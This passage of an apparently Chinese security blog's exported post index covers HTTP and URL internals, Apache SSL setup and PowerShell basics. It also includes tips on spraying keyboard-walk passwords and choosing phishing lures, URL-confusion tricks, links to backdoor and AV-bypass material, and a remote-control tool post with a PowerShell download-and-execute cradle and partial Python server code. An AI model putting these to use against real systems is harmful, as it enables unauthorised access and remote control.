Algorithm）\nMD5即消息摘要算法，是最著名、应用最为广泛的一种哈希算法，于1992年被公开。MD5之前还有MD4、MD3、MD2等哥哥算法，MD5是最终的改进版。\nMD5输入不定长度信息，输出固定长度为128-bits的散列\n### 未完 待补充\n\n","tags":["加密"],"categories":["安全"]},{"title":"Apache2自签发V3证书详细流程","url":"/Apache2-sign-certification/","content":"## 1. 生成自建CA Root\n### 什么是CA\nCA,Catificate Authority，数字证书认证中心，用于签发证书，保证客户端之间服务端的信任。CA实际上是在做key和cert的pair。\n常见的Symantec, Comodo等公司都是CA服务商。\n\n<!--more-->\n### 为什么要CA\n不经过CA签证的证书之间挂到Apache上也能用，但浏览器肯定会报错ERR_CERT_AUTHORITY_INVALID，带着一个红叉，需要点强行访问来通过。使用这些公司签发的证书浏览器能自动识别，是因为浏览器已经内置了这些厂商的根证书。\n我们自己做一个CA，一方面是可以去掉报错和红叉，另一方面也是为了实现双向认证模式。\n### 生成CA的key,CSR,Cert\n待补充\n### 生成CSR，并由CA签发\n待补充\n\n## 2.配置到Aapche2上\n1.将生成的证书和生成所用的key复制到目标服务器指定目录\n   \n2./etc/apache2/sites-available/default-ssl.conf\n将<VirtualHost _default_:443>节点下修改为如下\n\n    <VirtualHost _default_:443>\n    ServerAdmin shitao@transfereasy.com\n    ServerName localhost\n    DocumentRoot /var/www/html\n    SSLEngine on\n    SSLCertificateFile      /etc/apache2/ssl/apache.crt\n    SSLCertificateKeyFile /etc/apache2/ssl/apache.key\n\n3.确保打开ssl模块和default-ssl.conf文件，重启apache\n\n    sudo a2enmod ssl\n    sudo a2ensite default-ssl.conf\n    sudo service apache2 restart\n    \n4.打开url强制跳转\n\n    RewriteEngine on\n    RewriteCond %{SERVER_PORT} !^443$\n    RewriteRule ^/?(.*)$ https://%{SERVER_NAME}{REQUEST_URI} [L,R]","tags":["Linux"],"categories":["技术"]},{"title":"详解HTTP细节 1","url":"/Detailed-HTTP-protocol-1/","content":"\nHTTP协议基于TCP/IP协议，属于无状态协议\n\n<!--more-->\n\n## HTTP 0.9\n样例：\n`GET 192.168.1.2/test.txt`\nGET开头，空格接着URL地址和查询字符串，CRLF换行结束，返回结果默认是HTML格式（如果不是服务器也没法通知），HTTP 0.9不支持一台服务器IP对应多个域名，属于已经过时的协议，**但大部分浏览器仍然支持HTTP 0.9，这将导致一些安全问题**\n\n## HTTP 1.0/1.1\n请求样例：\n```\nGET /myweb/login.jsp HTTP/1.1\nCookie: JSESSIONID=77FC1A52E9C3BAD0536359386A96C0FB\nx-requested-with: XMLHttpRequest\nAccept-Language: zh-cn\nReferer: https://192.168.0.0:8443//myweb/login.jsp\nAccept: */*\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nHost: 192.168.0.0:8443\nConnection: Keep-Alive\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)\n```\n第一行包含具体的版本信息，紧接着数条“名称：值”键值对组成的数据行（头域 Headers），每行为一个头域。请求头部分以一个单独的空行结束，空行后面可以加上需要发送给服务器的数据，这些数据长度必须在请求头Content-Length里明确标出。HTTP协议对后面部分数据的格式没有明确要求。\n返回样例：\n```\nHTTP/1.1 200 OK\nServer: openresty\nDate: Tue, 08 Mar 2016 08:24:48 GMT\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: keep-alive\n\nHello world\n```\n第一行包含协议版本和状态码以及状态信息描述（可选），随后若干响应数据行，以一个单独空行结束，再后面是返回的正文内容。**实际情况里，状态码很不可靠**，如果客户端请求里Accept-Encoding没有规定能接受的压缩方式，服务器端可以在gzip、compress、deflate三种压缩方式里任选一种传输。\n\n## HTTP 1.0与1.1的差异\n- HTTP 1.1 加入了OPTIONS、PUT、DELETE、TRACE、CONNECT请求方法 （原有GET、POST、HEAD）\n- HTTP 1.1 增加数个头域\n - **增加了HOST域，以应对同一IP的多个虚拟主机**；\n - 增加了Upgrade头域，用来告诉服务端，客户端能够支持的其它备用通信协议；\n - 增加了Via头域，用来记录消息转发的路径，它记录了整个路径上所有发送方使用的版本号；\n - 增加了Cache-Control头域（请求消息和响应消息都可使用），用来控制缓存；\n - 增加Content-Range，用于节约优化。\n- HTTP 1.1 增加了100、305等24个新状态码\n- **HTTP 1.0中需要建立长连接头域必须有Connection: Keep-Alive，HTTP 1.1 默认打开长连接，而且HTTP 1.0的Proxy不支持Connection头域，协议规定所有出现在Connection头域中的头域名都将被忽略。**\n- HTTP 1.1允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容\n- **HTTP 1.1 支持Transfer-Encoding:chunked** 发送方将消息分割成若干个任意大小的数据块，每个数据块在发送时都会附上块的长度，最后用一个零长度的块作为消息结束的标志。这种方法允许发送方只缓冲消息的一个片段，避免缓冲整个消息带来的过载。**这个差别有可能导致内容解析问题。**\n- HTTP/1.1在1.0的基础上加入了一些cache的新特性，当缓存对象的Age超过Expire时变为stale对象，cache不需要直接抛弃stale对象，而是与源服务器进行重新激活（revalidation）。\n- date/timestamp (日期时间戳)有细微差别。\n\n## 关于RESTful\n中间插一句，最近很流行的一个概念RESTful，REST全称是Representational State Transfer，不过这个全称看着也很懵逼。提出这个概念的Roy Thomas Fielding是HTTP协议的主要设计者，以我的理解，REST其实是让我们回归HTTP方法本身的语义。\n\nHTTP 1.1 是1999年发表的，HTTP 2都发布了，但开发者几乎还在用HTTP 1.0的特性，请求方法平时几乎只用到GET和POST，大量的GET方法都不是幂等的。这显然有悖于HTTP 1.1的设计思想。\n\nREST作为一种标准或者约定，主要定义了以下几点：\n\n  - URL定位资源，URL都指向Resource，都应该是名词，不涉及任何操作语义\n  - 操作语义交给HTTP请求方法，GET和PUT应当幂等：\n   - GET 获取资源，\n   - POST 新建资源\n   - PUT 更新资源，\n   - DELETE 删除资源\n   - UPDATE 更新资源\n   \n  如上，其实HTTP协议的请求方法已经能覆盖所有对资源的操作了。\n  - HTTP传递资源（无论Json、XML还是二进制数据，都是资源的不同形式）\n  - 使用正确的HTTP状态码。HTTP 1.1就有三十多个状态码了。但我们平时用到的极少，很多网站都只有404、500、200这三个状态码。\n  - 用/嵌套的url来标示子资源，比如：/tickets/12/messages\n  - 用?来过滤资源\n  \n以上这些约定，仔细看不难发现，都是在重复和强调HTTP本身的语义。\n  \n## 安全问题","tags":["基础知识"],"categories":["技术"]},{"title":"详解URL细节","url":"/Detailed-URL/","content":"URL即Uniform Resource Locator，统一资源定位符，用来指定互联网上标准资源的地址。\n\n<!--more-->\n\n## URL标准结构\n> scheme://login:password@address:port/path/to/resource?query_string#fragment\n\n1. scheme 协议名称\n - 协议名称由一串不分大小写的字符串组成，以单个冒号结束。\n - 官方认可的有效URL协议由IANA维护，包括http:、https:、ftp:等十余种，但常见浏览器也支持其他伪协议，如data:、javascript:。\n - 浏览器在做进一步解析前，会先判断URL是相对URL还是绝对URL，相对URL要根据当前浏览的上下文才能判断完整的URL。最关键的区别就在于，URL最前面是否包含有效的协议名称。\n - 按照RFC1738规定，URL在冒号之前只允许出现数字字母及\"+\",\"-\",\".\"这三个符合，但实际应用环境中，**所有主流浏览器都会忽略前导换行符和空格**。IE还会忽略所有不可打印字符（ASCII 0x01~0x1F），Chrome会忽略0x00和NUL空字符，Opera协议名里可以包含高位字符。\n2. // 层级标记符 \n - RFC1738规定，每个层级结构URL里都必须包含//层级标记符，实际应用环境里各个浏览器表现不同。\n - http:example/ 在FireFox、Chrome、Safari里直接输入这个URL是可以正常解析的，等同与http://example/，但有基准URL时，这会被认为是指向example目录的相对路径。\n - javascript://example.com/%0alert(1) 所有浏览器都会认为这个字符串是有效的非层级伪URL，忽略前面的部分并直接执行Js。\n - mailto://user@example.com IE会忽略层级标记符，直接指向电子邮件地址，其他浏览器不能解析。\n - IE可以使用\\\\\\\\代替//。\n3. login:password 身份验证\n - URL身份验证属于可选项，身份验证信息的传输和协议有关，FTP等部分协议有效，HTTP等协议里如果强行加入这部分信息，没有明确规定怎么处理。\n - 大部分浏览器在身份验证部分里不接受数字字母外的几乎任何字符。\n4. address 服务器地址\n - RFC允许不区分大小的域名（example.com），IPv4地址（192.168.1.1），一对方括号里的IPv6地址（[0:0:0:0:0:0:0:1]），FireFox支持方括号里的IPv4地址和主机名，其他浏览器不允许。\n - 实际环境里，浏览器接受八进制、十进制、十六进制，甚至多字节专程单个整数的写法（和浏览器锁依赖的标准C类库有关）。\n - 大部分浏览器会忽略出现在URL内的 0x0A~0x0D、0xA0~0xAD之间的控制字符，而且会主动的把主机名里的全角句号\"。\"转为\".\"（只是主机名，在其他部分则不会转换）\n5. port 服务器端口\n- 在服务器连接的网络端口并非标准端口时会用到，UDP和TCP都依赖一个16位的端口号来区分不同服务。\n- 我们可以用浏览器想任意服务器发送数据，**即便浏览器不支持这些服务的协议**，比如SMTP。\n6. path to resource 层级文件路径\n- 层级文件路径借鉴自UNIX目录语义，支持\"/../\"和\"/./\"。\n- 现在的Web应用层级文件路径大多和实际物理路径没什么联系了。\n7. query_string 查询字符串 \n- 常见格式为 name1=value1&name2=value2... 但RFC实际上没有规定必须用这种格式，所以也允许query_string是一堆乱七八糟 的字符串，关键在于接受后怎么处理。\n8. fragment 片段ID\n- fragment和查询字符串有点类似，但它是用于客户端的一种可选信息，RFC里没有明确规定片段ID的功能和格式。\n- 实际运用里，片段ID在浏览器中只有一个用途：指向HTML页面的某个锚点。\n- 与query_string不同的是，改变fragment不会触发页面重载，也没有时间开销，所以可以用来存储一些客户端相关的数据。\n\n## 浏览器解析步骤\n1. 提取协议名称：查找第一个\"：\"，该字符左边的部分就是协议名称，如果协议名称里出现了不该有的字符，则该URL就是相对URL，这部分内容也不会当成协议处理。\n2. 去除层级标记符：如果有\"//\"就跳过，如果没有……那就不管了。在实际环境里，不用斜杠用一个用两个用三个其实都可以正常解析。\n3. 获取授权部分信息（登录信息+地址+端口）：依次查找“/”、“？”、“#”，哪个先出现以哪个为准截取，除了IE和Safari，分号；也是可接受的分隔符。\n- 授权部分信息提取出来后，先查找@符号，如果找到了，那它前面的部分就是登录信息，冒号前面是用户名，后面是密码\n- 剩下部分就是地址了，查找冒号：，如果有则前面的部分是地址，后面部分是端口，如果发现方括号[]，说明地址是IPv6\n4. 确定路径\n5. 提取查询字符串\n6. 提取片段ID\n\n## 陷阱和问题\n1. http://example.com&gibberish=1234@167772161/\n这个地址实际上指向的是167772161，转成正常的IPv4地址是10.0.0.1，@前面的部分是无效身份验证信息。\n2. http://example.com\\@coredump.cx/\n在FireFox里会访问coredump.cx，而其他浏览器里会访问example.com。\n3. http://example.com;.coredump.cx/\nIE会访问coredump.cx，而其他浏览器会访问example.com。\n","tags":["基础知识"],"categories":["技术"]},{"title":"Some Tips","url":"/some-tips/","content":"\n- 超过100人的公司，用键盘走位密码跑一遍，总会有收获。\n- Fishing内容：招聘——投递简历 科研——会议邀请 媒体——策划方案 销售——咨询产品 网站——错误反馈","tags":["Fishing"],"categories":["杂谈"]},{"title":"PowerShell XML处理和注册表(Default)取值 坑两则","url":"/powershell-xml-regedit/","content":"\n\n\n1. 处理XML时，PowerShell支持直接以对象的方式访问节点，像这样\n\t\n```\n<report>\n\t<baseInfo>\n\t\t<systemLanguage>zh-CN</systemLanguage>\n\t</baseInfo>\n\t<error>\n\t</error>\n</report>\n\nPS C:\\Users\\Woody> $xmlObj.report.baseInfo\n\nsystemLanguage\n--------------\nzh-CN\n```\n\n但如果目标节点是没有子级，这样取到的节点类型不是xmlnode，而是object，如下所示。\n<!--more-->\n\n```\nPS C:\\Users\\Woody> $test.report.baseInfo.systemlanguage.getType()\n\nIsPublic IsSerial Name                                     BaseType\n-------- -------- ----                                     --------\nTrue     True     String                                   System.Object\n\n\nPS C:\\Users\\Woody> $test.report.baseInfo.getType()\n\nIsPublic IsSerial Name                                     BaseType\n-------- -------- ----                                     --------\nTrue     False    XmlElement                               System.Xml.XmlLinkedNode\n```\n\n所以，如果想给一个空的节点添加子节点就不能这样写，因为没有对应方法，应该用selectNodes代替，如下所示。\n\n```\n\tPS C:\\Users\\Woody> $test.report.selectnodes(\"error\").item(0).gettype()\n\t\n\tIsPublic IsSerial Name                                     BaseType\n\t-------- -------- ----                                     --------\n\tTrue     False    XmlElement                               System.Xml.XmlLinkedNode\n\t\n\t\n\tPS C:\\Users\\Woody> $test.report.error.gettype()\n\t\n\tIsPublic IsSerial Name                                     BaseType\n\t-------- -------- ----                                     --------\n\tTrue     True     String                                   System.Object\n\t\n\t\n\tPS C:\\Users\\Woody> $test.report.error.appendChild\n    ##没反应，表示不存在##\n\tPS C:\\Users\\Woody> $test.report.selectnodes(\"error\").item(0).appendChild\n\t\n\t\n\tMemberType          : Method\n\tOverloadDefinitions : {System.Xml.XmlNode AppendChild(System.Xml.XmlNode newChild)}\n\tTypeNameOfValue     : System.Management.Automation.PSMethod\n\tValue               : System.Xml.XmlNode AppendChild(System.Xml.XmlNode newChild)\n\tName                : AppendChild\n\tIsInstance          : True\n```\n\n2. 注册表里有些键比较特殊，它里面包含一个Default项，如下图所示。如果想用PowerShell取这个值，要格外注意，**PowerShell自带的注册表访问方法是没法访问到这个值的，这是个Bug，** 我试了无数种访问方法，都不行，目测是（默认）和 (Default)这俩键值造成的冲突。\n\n![](http://7xlizz.com1.z0.glb.clouddn.com/注册表.png)\n![](http://7xlizz.com1.z0.glb.clouddn.com/注册表操作.png)\n\n解决办法只能是改用CMD的方式，用reg命令解决，如下所示。\n```\nreg Query HKLM\\System\\CurrentControlSet\\Control\\Nls\\Locale\\ /v \"(Default)\"\n```\n注意要先括号再引号","tags":["PowerShell"],"categories":["技术"]},{"title":"PowerShell 判断操作系统语言","url":"/powershell-check-system-language/","content":"\n###用PowerShell判断系统语言的的几种方法：\n\n\n\n1. systeminfo.exe\n   最简单的方法，但是数据不好进一步处理，而且速度慢\n2. WMI对象\n\n```\n(get-wmiobject win32_operatingsystem).MUILanguages\n```\n\n3. 用.net对象获取，结果更加完整\n\n```\nPS C:\\Users\\Woody> [System.Globalization.Cultureinfo]::InstalledUICulture\n\nLCID             Name             DisplayName\n----             ----             -----------\n2052             zh-CN            中文(中华人民共和国)、\n```\n<!--more-->\n\n4. 读注册表键值\n\n```\nfunction getSysLangurage(){\n   $langNum = reg Query HKLM\\System\\CurrentControlSet\\Control\\Nls\\Locale\\ /v \"(Default)\"\n   if($langNum -like \"*00000804\"){\n   return \"CH\"\n   }\n   elseif($langNum -like \"*00000409\"){\n   return \"EN\"\n   }\n   else\n   {return \"other\"}\n}\n```\n\n\n","tags":["PowerShell"],"categories":["技术"]},{"title":"PowerShell学习资料整理","url":"/powershell-learning-materials/","content":"\n这篇博文会长期更新，整理一些PowerShell、PowerShell安全相关的网站和学习资料。\n<!--more-->\n\n## 基础资料：\n* [微软PowerShell官网](https://msdn.microsoft.com/en-us/powershell \"MSDN\")\n* [MSDN PowerShell Blog](http://blogs.msdn.com/b/powershell/) 官博，很多新内容\n* [PowerShell中文站](http://www.pstips.net/) 有翻译好的在线教程，提供电子书下载\n* [PowerShell英文站](http://powershell.com/cs/) 资料各种全\n* [微软MVP吴波博客 叹为观止](http://blog.vichamp.com/) 常年更新PowerShell技巧\n* [PowerShellMagazine](http://powershell.net/) 偏资讯类\n* [网易云课堂 PowerShell管理第一季](http://study.163.com/course/introduction/1270015.htm#/courseDetail) 收费的，但也收录进来万一有人需要\n\n## GitHub\n\n* [PowerShell Module库](https://github.com/powershell)\n* [Nishang 安全相关PowerShell脚本集合（后门爆破扫描等等）](https://github.com/samratashok/nishang)\n* [PowerCat PS版的Netcat](https://github.com/besimorhino/powercat)\n\n\n## 下载资料\n* [Windows PowerShell 高级编程](http://www.pstips.net/professional-windows-powershell-programing.html)\n* [PowerShell 3.0 入门级教程](http://www.pstips.net/powershell-v3-basic-tutorial.html)\n* [PowerShell 3.0 进阶教程](http://www.pstips.net/powershell-3-0-advanced-tutorial-pdf.html)\n* [PowerShell 微软虚拟学院课程](http://blog.vichamp.com/powershell/2014/02/14/powershell-mva-lessons/)\n\n## 安全相关资料\n* [FreeBuf公开课 PowerShell内网渗透实例](http://open.freebuf.com/live/619.html)\n* [PowerShell Security](http://www.windowsecurity.com/articles-tutorials/windows_os_security/PowerShell-Security.html)\n* [通过DNS TXT记录执行powershell](http://drops.wooyun.org/tips/8971)\n* [使用powershell Client进行有效钓鱼](http://drops.wooyun.org/tips/8568)\n* [powershell各种反弹姿势以及取证（一）](http://drops.wooyun.org/tips/6199)\n* [powershell各种反弹姿势以及取证（二）](http://drops.wooyun.org/tips/6090)\n* [Powershell and Windows RAW SOCKET](http://drops.wooyun.org/tips/4707)\n* [Powershell tricks::Powershell Remoting](http://drops.wooyun.org/tips/3473)\n* [Powershell tricks::Bypass AV](http://drops.wooyun.org/tips/3353)\n* [BadUsb与PowerShell的结合利用](http://drops.wooyun.org/tips/9336)\n* [WMI Defense (PowerShell操作WMI)](http://drops.wooyun.org/tips/8290)\n* [WMI Backdoor](http://drops.wooyun.org/tips/8260)\n* [WMI Attacks](http://drops.wooyun.org/tips/8189)\n* [Empire：PowerShell后期漏洞利用代理工具](http://www.freebuf.com/articles/web/76892.html)\n* [PowerShell Remoting Cheatsheet](https://blog.netspi.com/powershell-remoting-cheatsheet/)\n\n## PowerShell其他应用\n暂缺","tags":["PowerShell"],"categories":["技术"]},{"title":"PowerShell入门系列2:cmdlet","url":"/powershell-introduction-2/","content":"\n### 什么是cmdlet\n\n* PowerShell里可以执行**内置的命令**和用户定义的内容（函数、脚本、别名、过滤器），还有可执行程序。\n其中**内置的命令**就叫做cmdlet，换个说法就是系统命令，也是继续学习PowerShell的基础。\n* cmdlet的特殊之处在于，每一个cmdlet都是一个.net object，运行于PowerShell进程里。\n* cmdlet的格式是**动词-名词，不区分大小写**，很清晰很长很恶心，但你可以自定义别名来缩短，这个后面还会讲。\n\n### 两条基础cmdlet\n\n* **Get-Command**，我们直接在PowerShell里执行Get-Command，结果如下\n\n```\nPS C:\\Users\\Woody> Get-Command\nCommandType     Name                            Definition\n-----------     ----                            ----------\nAlias           %                               ForEach-Object\nAlias           ac                              Add-Content\nAlias           asnp                            Add-PSSnapIn\nAlias           clc                             Clear-Content\nAlias           cli                             Clear-Item\nAlias           clp                             Clear-ItemProperty\nAlias           clv                             Clear-Variable\nAlias           compare                         Compare-Object\nAlias           cpi                             Copy-Item\nAlias           cpp                             Copy-ItemProperty\nAlias           cvpa                            Convert-Path\nAlias           dbp                             Disable-PSBreakpoin\nAlias           diff                            Compare-Object\nAlias           ebp                             Enable-PSBreakpoint\nAlias           epal                            Export-Alias\nAlias           epcsv                           Export-Csv\nAlias           fc                              Format-Custom\n……\n```\n\n**Get-Command不加任何的参数时，作用是显示当前作用域/当前会话支持的所有命令**（不仅限于Cmdlet）\n\n那如果想只查看Cmdlet命令呢，以传统cmd的处理方式就是用|管道符传递给findstr然后过滤，如下。\n\n```\nPS C:\\Users\\Woody> Get-Command|findstr \"Cmdlet\"\nCmdlet  Add-ComputerAdd-Computer [-DomainName] <...\nCmdlet  Add-Content Add-Content [-Path] <String[...\nCmdlet  Add-History Add-History [[-InputObject] ...\nCmdlet  Add-Member  Add-Member [-MemberType] <PS...\nCmdlet  Add-PSSnapinAdd-PSSnapin [-Name] <String...\nCmdlet  Add-TypeAdd-Type [-TypeDefinition] <...\nCmdlet  Checkpoint-Computer Checkpoint-Computer [-Descri...\nCmdlet  Clear-Content   Clear-Content [-Path] <Strin...\nCmdlet  Clear-EventLog  Clear-EventLog [-LogName] <S...\nCmdlet  Clear-History   Clear-History [[-Id] <Int32[...\nCmdlet  Clear-Item  Clear-Item [-Path] <String[]...\nCmdlet  Clear-ItemProperty  Clear-ItemProperty [-Path] <...\nCmdlet  Clear-Variable  Clear-Variable [-Name] <Stri...\n……\n……\n```\n\n**我们可以用Get-Command findstr来查看具体命令的属性**\n\n```\nPS C:\\Users\\Woody> Get-Command findstr\n\nCommandType     Name                            Definition\n-----------     ----                            ----------\nApplication     findstr.exe                     C:\\Windows\\system32\\findstr.exe\n```\n\n从CommandType我们可以发现\t，findstr并不是一个Cmdlet，而是一个可执行程序。那怎么用Cmdlet的方式来实现呢？引入下一个Cmdlet:Get-Help\n\n* Get-Help，执行Get-Help Get-Command,结果如下\n\n```\nPS C:\\Users\\Woody> Get-Help Get-Command\n\n名称\n    Get-Command\n\n摘要\n    获取有关 cmdlet 以及有关 Windows PowerShell 命令的其他元素的基本信息。\n\n语法\n\nGet-Command [[-Name] <string[]>] [-CommandType {Alias | Function | Filter |\n Cmdlet | ExternalScript | Application | Script | All}] [[-ArgumentList] <O\nbject[]>] [-Module <string[]>] [-Syntax] [-TotalCount <int>] [<CommonParame\nters>]\n\nGet-Command [-Noun <string[]>] [-Verb <string[]>] [[-ArgumentList] <Object[\n]>] [-Module <string[]>] [-Syntax] [-TotalCount <int>] [<CommonParameters>]\n```\n\t说明\n\t    Get-Command cmdlet 获取会话中 Windows PowerShell 命令的 cmdlet 及其他元素（\n\t    例如，别名、函数、筛选器、脚本和应用程序）的基本信息。\n\t\n\t    Get-Command 直接从 cmdlet、函数、脚本或别名的代码中获取其数据，而不像 Get-H\n\t    elp 那样从帮助主题文件中获取其信息。\n\t\n\t    如果不使用参数，“Get-Command”将获取当前会话中的所有 cmdlet 和函数。“Get-\n\t    Command *”获取所有 Windows PowerShell 元素以及 Path 环境变量 ($env:path)\n\t    中的所有非 Windows-PowerShell 文件。它将这些文件归入“Application”命令类型\n\t    。\n\t\n\t    可以使用 Get-Command 的 Module 参数查找通过添加 Windows PowerShell 管理单元\n\t    或导入模块而添加到会话中的命令。\n        ……\n\t\t……\n\nGet-Help的用法很简单，就是Get-Help 命令，结果里会详细的把各种信息都罗列出来。从结果我们可以看到Get-Command的其他参数，所以我们可以用Get-Command -CommandTpye cmdlet 来实现上面的功能，结果是一样的。\n\n有了这两个命令，其他命令就可以遇到再自食其力解决了。","tags":["PowerShell"],"categories":["技术"]},{"title":"Skill List","url":"/skill-list/","content":"\n### 2016年前该读完\n\n- 《Javascript高级编程》\n- 《Python灰帽子编程》\n- 《现代操作系统》\n\n### 要熟练什么\n\n- LinuxBash\n- PowerShell\n- Python爬虫\n- PHP、JS常用操作\n\n### 接下来做出什么\n\n- 维护好博客\n- 一个靠谱爬虫项目\n- 保持提交漏洞\n- leetcode\n\n","tags":["other"],"categories":["杂谈"]},{"title":"PowerShell入门系列1：介绍和快速开始","url":"/powershell-introduction-2/","content":"\n## PowerShell简介\n\n### PowerShell是什么？\n\nPowerShell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。\n相比Linux里的shell，Windows自带的cmd命令提示符显得有些简陋，所以从Windows 7之后微软提供了cmd的超级升级版——PowerShell。\n\n<!--more-->\n### 怎么安装PowerShell？\n\n大部分情况下是不需要安装的\n\nWindows 7/Windows Server 2008 内置PowerShell 2.0 </br>\nWindows 8/Windows Server 2012 内置PowerShell 3.0 </br>\nWindows 8.1/Windows Server 2012 R2 内置 PowerShell 4.0 </br>\nWindows 10 内置PowerShell 5.0预览版 </br>\n\n使用$psversiontable变量可以查看PowerShell，.net框架的版本。\n\n```\nPS C:\\Users\\Admin> $psversiontable\n\nName   Value\n----   -----\nCLRVersion 2.0.50727.5485\nBuildVersion   6.1.7601.17514\nPSVersion  2.0\nWSManStackVersion  2.0\nPSCompatibleVersions   {1.0, 2.0}\nSerializationVersion   1.1.0.1\nPSRemotingProtocolVersion  2.1\n\n```\n\nPowerShell 2.0已经可以满足大部分需求了，**如果需要新版本升级到这里下载**：</br>\n>PowerShell4.0 MSDN官方下载地址： [https://www.microsoft.com/en-us/download/details.aspx?id=40855](https://www.microsoft.com/en-us/download/details.aspx?id=40855)\n\n### PowerShell有哪些功能和特点？\n\n- PowerShell传递的是.net Object（PSObject），这与LinuxShell、CMD完全不同\n- PowerShell有完整的强类型支持\n- PowerShell和.net 还有COM、WMI、ADSI是无缝结合的\n- PowerShell支持CMD原有的所有命令\n- PowerShell的命令叫做cmdlet，采用动词-名词的形式，不区分大小写\n\n### 快速开始\n\n在运行里直接输入powershell，或者在附件 -> Windows PowerShell里面打开。</br>\nPS：如果在Windows7里面，这两种方式打开的PowerShell背景颜色、窗体样式不一样，但实际上它们都是同一个文件%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe，<b>没有任何区别</b>，只不过在附件里的快捷方式设置了一下背景颜色和窗体大小。\n\n按照传统，写一个最简单的hello world，\n在这里可以使用cmd的echo命令\"hello world\"，也可以使用write(\"hello world\")\n或者，其实他们本质是一样的，他们都是Write-Out的别名（Alias）\n\n```\nPS C:\\Users\\Test> write \"hello world\"\nhello world\nPS C:\\Users\\Test> echo(\"hello world\")\nhello world\nPS C:\\Users\\Test> write hello world\nhello\nworld\nPS C:\\Users\\Test> echo \"hello world\"\nhello world\n```\n\n执行一下你会发现与cmd里输出echo hello world还是有区别的，cmd里输出echo \"hello world\"会把引号也输出，而PS里加上括号/引号都会当成一个字符串输出，什么都不加时会分行输出。如上面代码所示。\n\n除了直接在Shell界面操作，也可以在文本编辑器里写了PS脚本，然后保存为.ps1格式，右键 -> 以PowerShell格式运行。\n\n当然，更推荐的code环境是PowerShell ISE，Win7以上系统全部自带，在运行输入powershell ise或者在附件里打开，界面如下图：\n![](http://7xlizz.com1.z0.glb.clouddn.com/QQ截图20150921182557.png)\n\n简单介绍一下：最上面一栏是脚本文件编辑的，中间一栏是运行结果，第三栏是console。这个编辑器看着简单其实功能蛮多的，之后会再次详细介绍。","tags":["PowerShell"],"categories":["技术"]},{"title":"深入理解JS笔记 1：数据类型Tips","url":"/deep-learn-javascript-reading-notes-1/","content":"\n\n备注：为了方便阅读《Javascript高级程序设计》 以下简称为 《J高》，笔记会引用很多该书内容，同时非常感谢笨蛋的座右铭的《理解Javascript》一系列文章。\n\n\n## 引用数据类型和原始数据类型\n\n* ECMA-262 把类型（type）定义为值的集合，每种原始类型定义了包含它的值的范围及其字面量表示形式\n* 5种原始数据类型：Null、Boolean、Number、String\n* 引用类型就是类（class），引用值就是对象，所以引用类型变量typeof的运算结果一定是一个object\n* 原始数据类型其值存在栈中，引用数据类型值存在堆中\n* 也就是说原始类型的值直接存在变量访问的位置，而引用类型存在变量处的值是一个指向堆的指针 \n* String类型比较特殊，它是唯一没有固定大小的原始类型，不过它还是存在栈中……\n* 每一个基础类型都有其对应的引用类型number Number,string String,boolean Boolean，推测结论：基本数据类型是对应引用数据类型的子类，为了提高效率，将基础类型放在了栈内存中，所以undefined继承自null（存疑）\n* 因此所有原始类型也都是伪类，都拥有toString()等object的方法\n* object\n\n<!--more-->\n\n## undefined 和 null \n\n* Undefined 代表未赋值的基本数据类型，Null 代表未赋值的引用数据类型\n* Undefined 只有唯一值 undefined，Null下只有唯一的值 null （注意大小写 =。=）\n* 但是为了效率，null 作为引用数据类型，其值仍然存在栈中\n* 因此导致了 null == undefined\n*  《J高》里的说法是，值undefined实际是从null派生（继承）而来的，所以null == undefined\n*  《J高》：typeof(null)会返回object，这是Javascript最初实现中的一个错误，但一直沿用至今，现在null被认为是对象的占位符，但从技术上来说它仍然是原始值（“从技术上说null是原始值”，大概是因为null存在栈中）\n* null 在参与数值运算时其值会自动转换为 0 ，undefined参与任何数值运算时，结果为NaN\n* 当函数无明确返回值时，返回的值是undefined\n\n\n## 对象和函数\n\n* 对象是一个无序属性的集合，这些属性的值位简单数据类型、对象或者函数。\n* 函数是对象的一种，实现上内部熟悉[[Class]]的值位 “Function” ，表明它是函数类型，除了对象的内部属性方法外，还有[[Construct]]、[[Call]]、[[Scope]]等内部属性。内部方法[[Construct]]用于实现作为构造器的逻辑，[[Call]]实现作为函数调用的逻辑。\n* Function是函数类型的用户接口\n* Object是对象类型的用户接口\n* Boolean，Number，String均为这三种简单数值类型的**对象包装器**\n* Date, Array, RegExp: 可以把它们看作是几种内置的扩展数据类型\n","tags":["基础知识"],"categories":["技术"]},{"title":"Python+PowerShell 一句话远控脚本思路","url":"/python-powershell-rat/","content":"## 简介\n从Win7开始，Windows全部自带极其强大的Powershell，Windows的新利器！我之后会陆续写一些关于Powershell应用的文章。\n\n这是用Python写服务端，PowerShell写客户端，基于Socket的一个远控脚本。\n其实Powershell也可以写服务端，选Python写服务端主要是为了在Linux服务器上也能跑。\n<!--more-->\n## 原理\n`iex (New-Object Sys.Net.Webclient).DownloadString(\"http://IP:Port/connect\")` \n\n- 用PowerShell上面的命令发Http请求得到客户端代码并用IEX命令执行\n- 客户端再次与服务端建立TCP链接，执行接收到的代码并返回处理结果\n- 服务端通过建立连接后收到的第一段数据判断是哪一种请求\n\n客户端代码完全可以放在Github或者其他Web服务器上，用同一个服务器与端口纯粹是为了快速搭建。\n\n## TODO\n- 客户端增加注册表操作\n- 优化文件上传下载\n- 客户端的异常处理\n\n## 代码 \n\n```\n# 这里只发个主要思路，直接用并不靠谱，我后续还改过很多代码。\n# -*- coding:utf-8 -*-\nimport sys\nimport socket\nimport threading\n\nif len(sys.argv) == 2:\n    port = int(sys.argv[1])\nelse:\n    sys.exit(\"Usage: server.py <port>\")\n\nallConnections = []\nallAddresses = []\n\n\ndef main():\n    threadCommand = threading.Thread(target=get_command)\n    threadCommand.start()\n    threadService = threading.Thread(target=service)\n    threadService.start()\n\n\n# 接受输入参数与控制命令\ndef get_command():\n    while 1:\n        command = raw_input(\"> \")\n        if command == \"list\":\n            print \"pk------------address-----------------port\"\n            pk = 1\n            for i in allAddresses:\n                print str(pk) + \"------\" + str(i[0]) + \"---------\" + 